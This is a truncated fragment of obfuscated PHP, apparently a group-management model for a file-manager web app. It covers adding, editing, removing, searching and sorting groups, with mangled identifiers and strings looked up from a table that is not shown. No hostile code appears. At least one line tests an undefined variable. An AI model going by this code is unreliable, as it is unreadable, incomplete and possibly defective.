$Ì–Ì¸ñ‰ =& $_SERVER[¯µç›È¢]; $Ø³ª½ğ± = $this->count() + 0.0; $ ŠÔ¶‚‚ = 0; $û¬«²˜› = 1; $´ª×…Ì€ = 0; $ñ¡©˜èó = 5000; for ($ö¬°ëˆñ = 0; $ö¬°ëˆñ < $Ø³ª½ğ±; $ö¬°ëˆñ = $ö¬°ëˆñ + $ñ¡©˜èó) { $ØóÍêıê = $this->limit($ö¬°ëˆñ, $ö¬°ëˆñ + $ñ¡©˜èó)->select(); foreach ($ØóÍêıê as $¾‹‚÷Å£) { $û¬«²˜› += $¾‹‚÷Å£[$Ì–Ì¸ñ‰[90]] * $¾‹‚÷Å£[$Ì–Ì¸ñ‰[1901]]; $ ŠÔ¶‚‚ += $¾‹‚÷Å£[$Ì–Ì¸ñ‰[90]] * ($¾‹‚÷Å£[$Ì–Ì¸ñ‰[1901]] - 1); $´ª×…Ì€ += $¾‹‚÷Å£[$Ì–Ì¸ñ‰[1901]]; } } $Óí”¦ìì = array($Ì–Ì¸ñ‰[1907] => $û¬«²˜›, $Ì–Ì¸ñ‰[1908] => $ ŠÔ¶‚‚, $Ì–Ì¸ñ‰[1909] => $ ŠÔ¶‚‚ / $û¬«²˜›, $Ì–Ì¸ñ‰[94] => $Ø³ª½ğ±, $Ì–Ì¸ñ‰[1910] => $´ª×…Ì€); return $Óí”¦ìì; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\x70"; protected $tableMeta = array("\x74\x61\142\154\145\116\x61\x6d\x65" => "\x67\x72\x6f\165\x70\137\155\x65\x74\141", "\x6d\x65\164\141\106\x69\x65\x6c\144" => "\x67\162\x6f\x75\x70\111\x44"); protected function cacheFunctionAlias($®›ı¸ß…) { $ÄĞçüë³ =& $_SERVER[¯µç›È¢]; return array($ÄĞçüë³[1911] => array($®›ı¸ß…[0], $ÄĞçüë³[1912]), $ÄĞçüë³[1913] => array($®›ı¸ß…[0], $ÄĞçüë³[1914])); } protected function getInfo($×•ü¤È, $ÀøÂÏ¡ñ = false) { $™ş§ö¤ = $this->getInfoSimple($×•ü¤È); if (!$™ş§ö¤) { return !1; } if ($ÀøÂÏ¡ñ) { return $this->_listDataApplyItem($™ş§ö¤); } return $this->cacheFunctionGet($_SERVER[¯µç›È¢][1915], $×•ü¤È); } protected function getInfoSimple($–¾Š”Ò“, $õÍ¾òÈ = false) { $“Öáµî =& $_SERVER[¯µç›È¢]; if ($õÍ¾òÈ) { $üçó”Ö = array($“Öáµî[1834] => intval($–¾Š”Ò“)); $Ò™é¹ü‘ = $this->where($üçó”Ö)->find(); return is_array($Ò™é¹ü‘) ? $Ò™é¹ü‘ : array(); } return $this->cacheFunctionGet($“Öáµî[1916], $–¾Š”Ò“); } protected function groupAdd($Áî¾£µ²) { $ÈÕ¸½ =& $_SERVER[¯µç›È¢]; if (!$Áî¾£µ²[$ÈÕ¸½[503]] && isset($Áî¾£µ²[$ÈÕ¸½[1834]]) && $Áî¾£µ²[$ÈÕ¸½[1834]] == 1) { if ($Äıƒ§õü = $this->getInfoSimple($Áî¾£µ²[$ÈÕ¸½[1834]], !0)) { return $Áî¾£µ²[$ÈÕ¸½[1834]]; } } else { $Äıƒ§õü = $this->getInfoSimple($Áî¾£µ²[$ÈÕ¸½[503]]); if (!$Äıƒ§õü) { return !1; } } $—ÏéÕì = $ÈÕ¸½[536]; if ($Äıƒ§õü[$ÈÕ¸½[526]]) { $—ÏéÕì = $Äıƒ§õü[$ÈÕ¸½[526]] . $Äıƒ§õü[$ÈÕ¸½[1834]] . $ÈÕ¸½[50]; } $Á‹ˆ²´å = array($ÈÕ¸½[426] => $this->groupNameAuto($Áî¾£µ²[$ÈÕ¸½[503]], $Áî¾£µ²[$ÈÕ¸½[32]]), $ÈÕ¸½[407] => $Áî¾£µ²[$ÈÕ¸½[503]], $ÈÕ¸½[592] => $—ÏéÕì, $ÈÕ¸½[1917] => $Áî¾£µ²[$ÈÕ¸½[1821]], $ÈÕ¸½[1918] => 0, $ÈÕ¸½[1838] => 0); if (isset($Áî¾£µ²[$ÈÕ¸½[1857]])) { $Á‹ˆ²´å[$ÈÕ¸½[1857]] = $Áî¾£µ²[$ÈÕ¸½[1857]]; } else { $ıÇéå¡ş = $this->max($ÈÕ¸½[1857]); if (!$ıÇéå¡ş) { $ıÇéå¡ş = 0; } $Á‹ˆ²´å[$ÈÕ¸½[1857]] = $ıÇéå¡ş + 1; } if (!empty($Áî¾£µ²[$ÈÕ¸½[1834]])) { $Á‹ˆ²´å[$ÈÕ¸½[1834]] = $Áî¾£µ²[$ÈÕ¸½[1834]]; } $î³õÒÓ™ = $this->add($Á‹ˆ²´å); $this->setNamePinyin($î³õÒÓ™, $Á‹ˆ²´å[$ÈÕ¸½[32]]); if (isset($Áî¾£µ²[$ÈÕ¸½[1919]])) { $this->metaSet($î³õÒÓ™, array($ÈÕ¸½[1919] => $Áî¾£µ²[$ÈÕ¸½[1919]], $ÈÕ¸½[1920] => $Áî¾£µ²[$ÈÕ¸½[1920]])); unset($Áî¾£µ²[$ÈÕ¸½[1919]]); unset($Áî¾£µ²[$ÈÕ¸½[1920]]); } Model($ÈÕ¸½[1337])->groupRootAdd($î³õÒÓ™); return $î³õÒÓ™; } protected function groupEdit($ŸÅÙßıÌ, $³‘Æ‘œ) { $çÅå÷ºü =& $_SERVER[¯µç›È¢]; $¼Ğ‚áÃŒ = $this->getInfoSimple($ŸÅÙßıÌ); if (!$¼Ğ‚áÃŒ) { return !1; } if (!empty($³‘Æ‘œ[$çÅå÷ºü[503]])) { $ÚúİÜ‚° = $this->getInfoSimple($³‘Æ‘œ[$çÅå÷ºü[503]]); if (!$ÚúİÜ‚°) { return !1; } if ($¼Ğ‚áÃŒ[$çÅå÷ºü[1834]] == $ÚúİÜ‚°[$çÅå÷ºü[1834]]) { return !1; } if ($³‘Æ‘œ[$çÅå÷ºü[503]] != $¼Ğ‚áÃŒ[$çÅå÷ºü[503]]) { if ($ÚúİÜ‚°[$çÅå÷ºü[526]] !== $¼Ğ‚áÃŒ[$çÅå÷ºü[526]] && strpos($ÚúİÜ‚°[$çÅå÷ºü[526]], $¼Ğ‚áÃŒ[$çÅå÷ºü[526]] . $¼Ğ‚áÃŒ[$çÅå÷ºü[1834]] . $çÅå÷ºü[50]) === 0) { return !1; } $³‘Æ‘œ[$çÅå÷ºü[592]] = $ÚúİÜ‚°[$çÅå÷ºü[526]] . $³‘Æ‘œ[$çÅå÷ºü[503]] . $çÅå÷ºü[50]; $this->_changeChildLevel($¼Ğ‚áÃŒ, $ÚúİÜ‚°); } } if (isset($³‘Æ‘œ[$çÅå÷ºü[32]])) { $this->setNamePinyin($ŸÅÙßıÌ, $³‘Æ‘œ[$çÅå÷ºü[32]]); } if (isset($³‘Æ‘œ[$çÅå÷ºü[1919]])) { $this->metaSet($ŸÅÙßıÌ, array($çÅå÷ºü[1919] => $³‘Æ‘œ[$çÅå÷ºü[1919]], $çÅå÷ºü[1920] => $³‘Æ‘œ[$çÅå÷ºü[1920]])); unset($³‘Æ‘œ[$çÅå÷ºü[1919]]); unset($³‘Æ‘œ[$çÅå÷ºü[1920]]); } $this->_clearChildrenCache($¼Ğ‚áÃŒ); return $this->where(array($çÅå÷ºü[1921] => $ŸÅÙßıÌ))->save($³‘Æ‘œ); } private function _clearChildrenCache($Äìö¯Ş¾) { $™»ŸŸ• =& $_SERVER[¯µç›È¢]; $½³­¶Ùµ = array($™»ŸŸ•[592] => array($™»ŸŸ•[552], $Äìö¯Ş¾[$™»ŸŸ•[526]] . $Äìö¯Ş¾[$™»ŸŸ•[1834]] . $™»ŸŸ•[553])); $Şë×–Øİ = $this->field($™»ŸŸ•[1834])->where($½³­¶Ùµ)->select(); foreach ($Şë×–Øİ as $‰Ô œÆˆ) { $this->_clearCache($‰Ô œÆˆ[$™»ŸŸ•[1834]]); } } private function _clearCache($ÆøÜ¬Øô) { $Â¿²˜Õ´ =& $_SERVER[¯µç›È¢]; $this->cacheFunctionClear($Â¿²˜Õ´[1915], $ÆøÜ¬Øô); $this->cacheFunctionClear($Â¿²˜Õ´[1916], $ÆøÜ¬Øô); } private function _changeChildLevel($€€¤…®ğ, $ÚÁ×€ë½, $°ï…µÌš = false) { $¾ÄÆĞ„Ã =& $_SERVER[¯µç›È¢]; $ØíõšÜ = $€€¤…®ğ[$¾ÄÆĞ„Ã[526]] . $€€¤…®ğ[$¾ÄÆĞ„Ã[1834]] . $¾ÄÆĞ„Ã[50]; $ø­¼«ëŸ = $ÚÁ×€ë½[$¾ÄÆĞ„Ã[526]] . $ÚÁ×€ë½[$¾ÄÆĞ„Ã[1834]] . $¾ÄÆĞ„Ã[50] . $€€¤…®ğ[$¾ÄÆĞ„Ã[1834]] . $¾ÄÆĞ„Ã[50]; if ($°ï…µÌš) { $ø­¼«ëŸ = $ÚÁ×€ë½[$¾ÄÆĞ„Ã[526]] . $ÚÁ×€ë½[$¾ÄÆĞ„Ã[1834]] . $¾ÄÆĞ„Ã[50]; } $™ÓîşÄÇ = array($¾ÄÆĞ„Ã[592] => array($¾ÄÆĞ„Ã[552], $€€¤…®ğ[$¾ÄÆĞ„Ã[526]] . $€€¤…®ğ[$¾ÄÆĞ„Ã[1834]] . $¾ÄÆĞ„Ã[553])); $‘¿ß›÷ = array($¾ÄÆĞ„Ã[592] => array($¾ÄÆĞ„Ã[601], "\x72\145\x70\x6c\x61\143\x65\x28\160\141\162\145\x6e\x74\x4c\145\x76\145\154\x2c\x27{$ØíõšÜ}\47\54\x27{$ø­¼«ëŸ}\47\51")); $this->_clearChildrenCache($€€¤…®ğ); $this->where($™ÓîşÄÇ)->data($‘¿ß›÷)->save(); } public function setNamePinyin($¸‘Ê°, $´çú´é¸ = false) { $™©ÜÇâ =& $_SERVER[¯µç›È¢]; if (!$´çú´é¸) { $ôŸ‹¨ÑŠ = $this->getInfoSimple($¸‘Ê°); $´çú´é¸ = $ôŸ‹¨ÑŠ[$™©ÜÇâ[32]]; } if (!Input::check($´çú´é¸, $™©ÜÇâ[595])) { $this->metaSet($¸‘Ê°, $™©ÜÇâ[469], null); $this->metaSet($¸‘Ê°, $™©ÜÇâ[468], null); return; } $ª©€Øë = array($™©ÜÇâ[469] => str_replace($™©ÜÇâ[53], $™©ÜÇâ[12], Pinyin::get($´çú´é¸)), $™©ÜÇâ[468] => Pinyin::get($´çú´é¸, $™©ÜÇâ[596])); $this->metaSet($¸‘Ê°, $ª©€Øë); } protected function groupStatus($ıÙê·Š, $ËÃ¥§ˆˆ) { $Ş€à¸¾ =& $_SERVER[¯µç›È¢]; $ÈÁ¼ŠÀ‹ = $this->getInfoSimple($ıÙê·Š); if (!$ÈÁ¼ŠÀ‹) { return !1; } if ($ËÃ¥§ˆˆ == $Ş€à¸¾[99]) { $¾õ×¯—‹ = $this->parentLevelArray($ÈÁ¼ŠÀ‹[$Ş€à¸¾[526]]); } else { $å£Â”œ = array($Ş€à¸¾[592] => array($Ş€à¸¾[552], $ÈÁ¼ŠÀ‹[$Ş€à¸¾[526]] . $ÈÁ¼ŠÀ‹[$Ş€à¸¾[1834]] . $Ş€à¸¾[553])); $¾õ×¯—‹ = $this->where($å£Â”œ)->field($Ş€à¸¾[1834])->select(); $¾õ×¯—‹ = array_to_keyvalue($¾õ×¯—‹, $Ş€à¸¾[12], $Ş€à¸¾[1834]); } $¾õ×¯—‹[] = $ÈÁ¼ŠÀ‹[$Ş€à¸¾[1834]]; $Ä¾ßı³Ú = array(); foreach ($¾õ×¯—‹ as $ıÙê·Š) { $Ä¾ßı³Ú[] = array($Ş€à¸¾[1834] => $ıÙê·Š, $Ş€à¸¾[105] => $Ş€à¸¾[767], $Ş€à¸¾[382] => $ËÃ¥§ˆˆ); $this->_clearCache($ıÙê·Š); } return Model($Ş€à¸¾[1922])->addAll($Ä¾ßı³Ú, array(), !0); } protected function groupRemove($òÅÏê‘¡, $†œ—Ğ¿Å = false) { $«¯†×Õ  =& $_SERVER[¯µç›È¢]; $¡„Œá•¦ = array($«¯†×Õ [1834] => $òÅÏê‘¡); $šÀÅÊÏà = $this->where($¡„Œá•¦)->find(); if (!$šÀÅÊÏà || $šÀÅÊÏà[$«¯†×Õ [503]] == 0) { return !1; } if (!$†œ—Ğ¿Å) { $û‡‚êí€ = $this->getInfoSimple($šÀÅÊÏà[$«¯†×Õ [503]]); $this->_changeChildLevel($šÀÅÊÏà, $û‡‚êí€, !0); $this->where(array($«¯†×Õ [503] => $òÅÏê‘¡))->save(array($«¯†×Õ [503] => $šÀÅÊÏà[$«¯†×Õ [503]])); } Model($«¯†×Õ [1922])->where($¡„Œá•¦)->delete(); Model($«¯†×Õ [1923])->where($¡„Œá•¦)->delete(); Model($«¯†×Õ [842])->groupRootRemove($òÅÏê‘¡); return $this->where($¡„Œá•¦)->delete(); } protected function groupSort($¢ãòÉ©Ü) { $Ò×Û®á— =& $_SERVER[¯µç›È¢]; $‚ÇÍÅâ = array(); foreach ($¢ãòÉ©Ü as $Ùæ—©øµ => $ÉÔöƒöÚ) { $‚ÇÍÅâ[] = array($Ò×Û®á—[1834], $ÉÔöƒöÚ, $Ò×Û®á—[1857], $Ùæ—©øµ + 1); } $this->saveAll($‚ÇÍÅâ); } public function listData() { $Ñë§ÊÚ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ñë§ÊÚ[$_SERVER[¯µç›È¢][377]]); return $Ñë§ÊÚ; } private function _makeOrder($”éİ‘ñ = '') { $æÕøáöº =& $_SERVER[¯µç›È¢]; $¨ÅÓÎÊ = array($æÕøáöº[1834], $æÕøáöº[32], $æÕøáöº[1823], $æÕøáöº[207]); $ Éó§Åë = array($æÕøáöº[453] => $æÕøáöº[454], $æÕøáöº[455] => $æÕøáöº[456]); $Ìš•Ûæ½ = Input::get($æÕøáöº[460], $æÕøáöº[7], $æÕøáöº[1838], $¨ÅÓÎÊ); $º¸´‰· = Input::get($æÕøáöº[461], $æÕøáöº[7], $æÕøáöº[1924], array($æÕøáöº[1924], $æÕøáöº[455])); $º¸´‰· = $ Éó§Åë[$º¸´‰·]; $”éİ‘ñ = $”éİ‘ñ . "{$Ìš•Ûæ½}\x20{$º¸´‰·}\54\x20\147\x72\x6f\x75\x70\x49\x44\x20\141\163\143"; return $this->order($”éİ‘ñ); } public function listChild($†äÓåàİ) { $¼Çü³Äº =& $_SERVER[¯µç›È¢]; $í¯ñ·‚å = $this->where(array($¼Çü³Äº[503] => $†äÓåàİ))->_makeOrder()->selectPage(200); $this->_listDataApply($í¯ñ·‚å[$¼Çü³Äº[377]]); return $í¯ñ·‚å; } public function listChildIds($Ší·¹îµ) { $¶¹ ¥Õ =& $_SERVER[¯µç›È¢]; if (is_string($ÓôËÔß¶)) { $Ší·¹îµ = explode($¶¹ ¥Õ[50], $Ší·¹îµ); } $›¼ÇüÓ¹ = $this->where(array($¶¹ ¥Õ[1834] => array($¶¹ ¥Õ[7], $Ší·¹îµ)))->field($¶¹ ¥Õ[1925])->select(); if (!$›¼ÇüÓ¹) { return !1; } $Ê‡ìÀÜÚ = array(); foreach ($›¼ÇüÓ¹ as $‰‚ÊıŸó) { $Ê‡ìÀÜÚ[] = "\x73\145\x6c\145\x63\164\40\147\x72\x6f\165\x70\111\x44\40\x66\162\x6f\x6d\x20\x60\147\x72\157\165\x70\140\40\167\x68\x65\162\145\40\x70\141\162\x65\x6e\x74\114\145\x76\145\154\x20\x6c\x69\x6b\145\40\x27{$‰‚ÊıŸó[$¶¹ ¥Õ[526]]}{$‰‚ÊıŸó[$¶¹ ¥Õ[1834]]}\54\x25\47"; } $Ê‡ìÀÜÚ = implode($¶¹ ¥Õ[1926], $Ê‡ìÀÜÚ); $›¼ÇüÓ¹ = $this->query($Ê‡ìÀÜÚ); if (!$›¼ÇüÓ¹) { return array(); } $Ší·¹îµ = array_to_keyvalue($›¼ÇüÓ¹, $¶¹ ¥Õ[12], $¶¹ ¥Õ[1834]); return array_unique($Ší·¹îµ); } public function listByID($ó—ˆîœ•) { $…­”ìÛÉ =& $_SERVER[¯µç›È¢]; if (!$ó—ˆîœ•) { return array(); } $Ï§¦€ÜŞ = array($…­”ìÛÉ[1834] => array($…­”ìÛÉ[7], $ó—ˆîœ•)); $˜›€¥·Ì = $this->where($Ï§¦€ÜŞ)->select(); $˜›€¥·Ì = array_sort_keep($˜›€¥·Ì, $…­”ìÛÉ[1834], $ó—ˆîœ•); $this->_listDataApply($˜›€¥·Ì); return $˜›€¥·Ì; } public function listSearch($Éå»‹³À) { $é†¶‹˜» =& $_SERVER[¯µç›È¢]; $óæğòÁà = $Éå»‹³À[$é†¶‹˜»[1927]]; $·È·ÑÓ‚ = isset($Éå»‹³À[$é†¶‹˜»[1928]]) ? $Éå»‹³À[$é†¶‹˜»[1928]] : !1; if (!trim($óæğòÁà)) { return !1; } $óæğòÁà = str_replace($é†¶‹˜»[1929], $é†¶‹˜»[1930], $óæğòÁà); $÷”¦íş = array($é†¶‹˜»[1834] => array($é†¶‹˜»[391], "{$óæğòÁà}\45"), $é†¶‹˜»[32] => array($é†¶‹˜»[391], "\x25{$óæğòÁà}\45"), $é†¶‹˜»[1012] => $é†¶‹˜»[1931]); if ($·È·ÑÓ‚) { $¡÷«òë· = $this->getInfoSimple($·È·ÑÓ‚); $ıì¦­€½ = $¡÷«òë·[$é†¶‹˜»[526]] . $·È·ÑÓ‚ . $é†¶‹˜»[553]; $÷”¦íş = array($÷”¦íş, array($é†¶‹˜»[526] => array($é†¶‹˜»[391], $ıì¦­€½))); } $÷”¦íş = $this->parseWhereLike($÷”¦íş); $âêÓ¯± = $this->_makeOrder()->where($÷”¦íş)->selectPage(20); $âêÓ¯± = $âêÓ¯± ? $âêÓ¯± : array($é†¶‹˜»[377] => array(), $é†¶‹˜»[374] => array()); if (!$âêÓ¯± || count($âêÓ¯±[$é†¶‹˜»[377]]) < 5 && Input::check($óæğòÁà, $é†¶‹˜»[326])) { $‘åİü²Š = $this->groupChildrenAll($·È·ÑÓ‚); $Ï¨Ú´Š = $this->_searchFromMeta($é†¶‹˜»[468], $óæğòÁà, 10, $‘åİü²Š); $õŸİ½ËŞ = $this->_searchFromMeta($é†¶‹˜»[469], $óæğòÁà, 10, $‘åİü²Š); $Öäİ’Æ¯ = array_merge($Ï¨Ú´Š, $õŸİ½ËŞ, $âêÓ¯±[$é†¶‹˜»[377]]); $âêÓ¯±[$é†¶‹˜»[377]] = array_unique_by_key($Öäİ’Æ¯, $é†¶‹˜»[1834]); $âêÓ¯±[$é†¶‹˜»[374]][$é†¶‹˜»[375]] = count($âêÓ¯±[$é†¶‹˜»[377]]); $âêÓ¯±[$é†¶‹˜»[374]][$é†¶‹˜»[376]] = ceil($âêÓ¯±[$é†¶‹˜»[374]][$é†¶‹˜»[375]] / $âêÓ¯±[$é†¶‹˜»[374]][$é†¶‹˜»[371]]); } $this->_listDataApply($âêÓ¯±[$é†¶‹˜»[377]]); return $âêÓ¯±; } protected function groupChildrenAll($‚¦×•˜í) { $áÖ¤é° =& $_SERVER[¯µç›È¢]; if (!$‚¦×•˜í) { return !1; } if (is_string($‚¦×•˜í)) { $‚¦×•˜í = array($‚¦×•˜í); } $œ†‹„ = $‚¦×•˜í; foreach ($‚¦×•˜í as $õŒÅÌï¶) { $¼˜ùÇ™¢ = $this->getInfoSimple($õŒÅÌï¶); $õÆ¦‹Ö¾ = array($áÖ¤é°[526] => array($áÖ¤é°[391], $¼˜ùÇ™¢[$áÖ¤é°[526]] . $õŒÅÌï¶ . $áÖ¤é°[553])); $ùæ×ÚÙü = $this->field($áÖ¤é°[1834])->where($õÆ¦‹Ö¾)->select(); $œ†‹„ = array_merge($œ†‹„, array_to_keyvalue($ùæ×ÚÙü, $áÖ¤é°[12], $áÖ¤é°[1834])); } return array_unique($œ†‹„); } private function _searchFromMeta($ÁÚ•¹ü€, $šÎ¶áÈ², $¿í“øöŠ, $ëÏİ†Æ¹) { $÷ôà÷Ú¢ =& $_SERVER[¯µç›È¢]; $šÎ¶áÈ² = strtolower($šÎ¶áÈ²); $íÄÊ¬ñƒ = array($÷ôà÷Ú¢[105] => $ÁÚ•¹ü€, $÷ôà÷Ú¢[382] => array($÷ôà÷Ú¢[391], "\45{$šÎ¶áÈ²}\45")); $íÄÊ¬ñƒ = $this->parseWhereLike($íÄÊ¬ñƒ); if ($ëÏİ†Æ¹) { $íÄÊ¬ñƒ[$÷ôà÷Ú¢[1834]] = array($÷ôà÷Ú¢[7], $ëÏİ†Æ¹); } $’íİÖîØ = Model($÷ôà÷Ú¢[1932])->where($íÄÊ¬ñƒ)->limit($¿í“øöŠ)->select(); if (!$’íİÖîØ) { return array(); } $’íİÖîØ = array_to_keyvalue($’íİÖîØ, $÷ôà÷Ú¢[12], $÷ôà÷Ú¢[1834]); $ìíòèÖ¨ = $this->where(array($÷ôà÷Ú¢[1921] => array($÷ôà÷Ú¢[7], $’íİÖîØ)))->select(); if (!$ìíòèÖ¨) { return array(); } return $ìíòèÖ¨; } protected function _listDataApplyItem($úÊŸğÒ) { $êÙ°È—É = array($úÊŸğÒ); $this->_listDataApply($êÙ°È—É); return $êÙ°È—É[0]; } protected function _listDataApply(&$ØÊİª‹ô) { $¤‘öÏÓİ =& $_SERVER[¯µç›È¢]; if (!$ØÊİª‹ô) { return; } $¦ûøƒ› = array_to_keyvalue($ØÊİª‹ô, $¤‘öÏÓİ[12], $¤‘öÏÓİ[1834]); $this->_listAppendChildren($ØÊİª‹ô); $this->_listAppendChildrenMember($ØÊİª‹ô); $this->_listAppendMeta($ØÊİª‹ô, $¦ûøƒ›); $this->_listAppendParent($ØÊİª‹ô); $this->_listAppendSourceRoot($ØÊİª‹ô, $¦ûøƒ›); } private function _listAppendChildren(&$ùÅÙ¬º) { $•ıĞÕª¹ =& $_SERVER[¯µç›È¢]; $ ˜†Ÿİ = array_to_keyvalue($ùÅÙ¬º, $•ıĞÕª¹[12], $•ıĞÕª¹[1834]); $”ø»®¯· = array($•ıĞÕª¹[503] => array($•ıĞÕª¹[7], $ ˜†Ÿİ)); $¬•êİ­ƒ = array($•ıĞÕª¹[503], $•ıĞÕª¹[1933] => $•ıĞÕª¹[505]); $†ñáéÈ³ = $this->field($¬•êİ­ƒ)->where($”ø»®¯·)->group($•ıĞÕª¹[503])->select(); $Ì÷÷½¯Š = array_to_keyvalue($†ñáéÈ³, $•ıĞÕª¹[503], $•ıĞÕª¹[505]); foreach ($ùÅÙ¬º as &$¦‹ÔÀğ£) { $Øİó¦¶Ï = $¦‹ÔÀğ£[$•ıĞÕª¹[1834]]; $¦‹ÔÀğ£[$•ıĞÕª¹[1934]] = isset($Ì÷÷½¯Š[$Øİó¦¶Ï]) ? intval($Ì÷÷½¯Š[$Øİó¦¶Ï]) : !1; } unset($¦‹ÔÀğ£); } private function _listAppendChildrenMember(&$‰‡¥¶áÉ) { $åªĞıõ =& $_SERVER[¯µç›È¢]; $Ãæ—Œ´ = array_to_keyvalue($‰‡¥¶áÉ, $åªĞıõ[12], $åªĞıõ[1834]); $‘Àƒ¾É = array($åªĞıõ[1834] => array($åªĞıõ[7], $Ãæ—Œ´)); $øäµ÷ñÍ = array($åªĞıõ[1834], $åªĞıõ[1933] => $åªĞıõ[505]); $Œ‘üšàß = Model($åªĞıõ[1923])->field($øäµ÷ñÍ)->where($‘Àƒ¾É)->group($åªĞıõ[1834])->select(); $º”Ëãô = array_to_keyvalue($Œ‘üšàß, $åªĞıõ[1834], $åªĞıõ[505]); foreach ($‰‡¥¶áÉ as &$şß½åÁø) { $ùôòœ = $şß½åÁø[$åªĞıõ[1834]]; $şß½åÁø[$åªĞıõ[1935]] = isset($º”Ëãô[$ùôòœ]) ? intval($º”Ëãô[$ùôòœ]) : !1; } unset($şß½åÁø); } private function _listAppendMeta(&$û«º—¸€, $Šµõô™) { $ÅŸá•Ê¨ =& $_SERVER[¯µç›È¢]; $ë«•ñ’¡ = array($ÅŸá•Ê¨[1834] => array($ÅŸá•Ê¨[7], $Šµõô™)); $É¼º˜ùŠ = Model($ÅŸá•Ê¨[1922])->where($ë«•ñ’¡)->select(); $É¼º˜ùŠ = array_to_keyvalue_group($É¼º˜ùŠ, $ÅŸá•Ê¨[1834]); foreach ($É¼º˜ùŠ as &$¾Ôğáªö) { $¾Ôğáªö = array_to_keyvalue($¾Ôğáªö, $ÅŸá•Ê¨[105], $ÅŸá•Ê¨[382]); } unset($¾Ôğáªö); foreach ($û«º—¸€ as &$ˆ´Êïš) { $ˆ´Êïš[$ÅŸá•Ê¨[470]] = array(); if (isset($É¼º˜ùŠ[$ˆ´Êïš[$ÅŸá•Ê¨[1834]]])) { $ˆ´Êïš[$ÅŸá•Ê¨[470]] = $É¼º˜ùŠ[$ˆ´Êïš[$ÅŸá•Ê¨[1834]]]; } } unset($ˆ´Êïš); } protected function parentLevelArray($ÙİŠèÂ±) { $›‚¤±åƒ =& $_SERVER[¯µç›È¢]; $ÙİŠèÂ± = explode($›‚¤±åƒ[50], trim($ÙİŠèÂ±, $›‚¤±åƒ[50])); $ÙİŠèÂ± = array_remove_value($ÙİŠèÂ±, $›‚¤±åƒ[204]); return $ÙİŠèÂ±; } private function _listAppendParent(&$š˜èò°Î) { $ÜŸÕ÷ÜÙ =& $_SERVER[¯µç›È¢]; $¢¤È½¬† = array(); foreach ($š˜èò°Î as &$ñ’¾—³) { $¢¤È½¬†[$ñ’¾—³[$ÜŸÕ÷ÜÙ[1834]]] = $ñ’¾—³[$ÜŸÕ÷ÜÙ[32]]; $±î¾­Ğı = $this->parentLevelArray($ñ’¾—³[$ÜŸÕ÷ÜÙ[526]]); foreach ($±î¾­Ğı as $™ùÌÊ‰†) { if (!isset($¢¤È½¬†[$™ùÌÊ‰†])) { $¢¤È½¬†[$™ùÌÊ‰†] = 0; } } } unset($ñ’¾—³); foreach ($¢¤È½¬† as $…¯Ò¹ôú => $¸ÙøÂÊ) { if ($¸ÙøÂÊ) { continue; } $‚Ÿ°şÍ‰ = $this->getInfoSimple($…¯Ò¹ôú); $¢¤È½¬†[$…¯Ò¹ôú] = $‚Ÿ°şÍ‰[$ÜŸÕ÷ÜÙ[32]]; } $¢¾××Õó = $GLOBALS[$ÜŸÕ÷ÜÙ[6]][$ÜŸÕ÷ÜÙ[100]][$ÜŸÕ÷ÜÙ[1936]]; if ($GLOBALS[$ÜŸÕ÷ÜÙ[508]] == $ÜŸÕ÷ÜÙ[99]) { $¢¾××Õó = !1; } foreach ($š˜èò°Î as &$ñ’¾—³) { $±î¾­Ğı = $this->parentLevelArray($ñ’¾—³[$ÜŸÕ÷ÜÙ[526]]); $ÃİıèÔÁ = $ÜŸÕ÷ÜÙ[12]; foreach ($±î¾­Ğı as $…¯Ò¹ôú => $™ùÌÊ‰†) { if ($¢¾××Õó && $…¯Ò¹ôú == 0) { continue; } $ÃİıèÔÁ .= $¢¤È½¬†[$™ùÌÊ‰†] . $ÜŸÕ÷ÜÙ[8]; } if ($±î¾­Ğı) { $ÃİıèÔÁ .= $ñ’¾—³[$ÜŸÕ÷ÜÙ[32]]; } $ñ’¾—³[$ÜŸÕ÷ÜÙ[531]] = str_replace($ÜŸÕ÷ÜÙ[534], $ÜŸÕ÷ÜÙ[8], $ÃİıèÔÁ); } unset($ñ’¾—³); } private function _listAppendSourceRoot(&$†ş¦º´ˆ, $ü“¬Ğ¢Ó) { $ı£šà¸ =& $_SERVER[¯µç›È¢]; $ŒŒ½½³œ = Model($ı£šà¸[842])->listSourceRoot(SourceModel::TYPE_GROUP, $ü“¬Ğ¢Ó); $ŒŒ½½³œ = array_to_keyvalue($ŒŒ½½³œ, $ı£šà¸[510]); $ŒŒ½½³œ = array_remove_key($ŒŒ½½³œ, $ı£šà¸[510]); foreach ($†ş¦º´ˆ as &$ş°ŞƒŒç) { $ş°ŞƒŒç[$ı£šà¸[97]] = $ŒŒ½½³œ[$ş°ŞƒŒç[$ı£šà¸[1834]]] ? $ŒŒ½½³œ[$ş°ŞƒŒç[$ı£šà¸[1834]]] : array(); } unset($ş°ŞƒŒç); } protected function groupMerge($”ÓäÇÍ¦) { $”ÓäÇÍ¦ = array_values(array_unique($”ÓäÇÍ¦)); $æ£”Ñ– = array(); for ($€’Ñ´¦î = 0; $€’Ñ´¦î < count($”ÓäÇÍ¦); $€’Ñ´¦î++) { $í¢‹¥íª = !1; for ($äüõÓ©­ = 0; $äüõÓ©­ < count($”ÓäÇÍ¦); $äüõÓ©­++) { if ($€’Ñ´¦î == $äüõÓ©­) { continue; } if ($this->isParentOf($”ÓäÇÍ¦[$äüõÓ©­], $”ÓäÇÍ¦[$€’Ñ´¦î])) { $í¢‹¥íª = !0; break; } } if (!$í¢‹¥íª) { $æ£”Ñ–[] = $”ÓäÇÍ¦[$€’Ñ´¦î]; } } return $æ£”Ñ–; } protected function isParentOf($˜ŞêŠğº, $˜İ¸æ˜ª) { $ëšóŞÙù =& $_SERVER[¯µç›È¢]; if (!$˜ŞêŠğº || !$˜İ¸æ˜ª || $˜ŞêŠğº == $˜İ¸æ˜ª) { return !1; } $Í‚ÑŞİ = $this->getInfoSimple($˜ŞêŠğº); $µ±³ˆº‹ = $this->getInfoSimple($˜İ¸æ˜ª); $³æ¼¶ôø = $Í‚ÑŞİ[$ëšóŞÙù[526]] . $˜ŞêŠğº . $ëšóŞÙù[50]; if (substr($µ±³ˆº‹[$ëšóŞÙù[526]], 0, strlen($³æ¼¶ôø)) == $³æ¼¶ôø) { return !0; } return !1; } public function groupShowRoot($½Í·Ù³‘, $»º¿¸àÓ = false) { $©ê•ç¥Å =& $_SERVER[¯µç›È¢]; $ÉüÀæ³» = $this->getInfo($½Í·Ù³‘); if (!$ÉüÀæ³») { return array(); } $÷²ŠŠ“ = 